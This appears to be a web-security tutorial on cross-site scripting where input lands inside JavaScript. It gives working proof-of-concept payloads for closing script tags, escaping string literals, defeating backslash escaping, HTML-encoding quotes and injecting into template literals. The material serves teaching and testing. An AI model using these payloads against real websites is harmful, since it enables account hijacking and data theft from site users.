Some XSS context can be found inside JavaScript within the response. In this situation, a wide variety of results can arise, with different techniques necessary to successfully perform an exploit.
## Terminating Existing Script
In the simplest case, it is possible to simply close the script tag in the existing JavaScript, and introduce a new HTML tag that will trigger the execution of JavaScript. For example, if the XSS context is as follows:
```js
<script>
var input = 'controllable data here';
</script>
```
An attacker can simply use the following payload to break out of existing JavaScript and execute their payload:
```html
';</script><img src=1 onerror=alert(document.domain) />
```
## Breaking Out of a JavaScript String
Some XSS contexts are inside a quoted string literal. The following are some useful ways of breaking out of a string literal:
```js
'-alert(document.domain)-'
```
```js
';alert(document.domain)//
```
It is important to repair or comment out the script following the XSS payload, as any syntax error will prevent the whole script from executing.

However, some applications escapes single or double-quote characters with a backslash, which tells the JavaScript parser to interpret it as a string instead of as a special character. You can attempt to bypass this by neutralizing the backslash added by the application using your own backslash character.

For example, suppose the input:
```js
';alert(document.domain)//
```
gets converted to:
```js
\';alert(document.domain)//
```
The alternative payload would be:
```js
\';alert(document.domain)//
```
which gets converted to:
```js
\\';alert(document.domain)//
```
Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.
## Making use of HTML-encoding
Some applications blocks or sanitizes certain characters that are needed for a successful XSS exploit. This can often be bypassed by HTML-encoding those characters.

For example, if the XSS context is as follows:
```html
<a href="#" onclick="...var input='data';...">
```
and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string:
```html
&apos;-alert(document.domain)-&apos;
```
## JavaScript Template Literals
The JavaScript template literals are string literals that allow embedded JavaScript expressions which are evaluated and are normally concatenated into the surrounding text. Template literals uses backticks instead of quotation marks and are embedded using the `${...}` syntax.

 For example, the following script will print a welcome message that includes the user's first name: 
```js
document.getElementById('message').innerText = `Welcome, ${user.firstName}!`;
```
An attacker can simply use the following payload without terminating the template literal:
```js
${alert(document.domain)}
```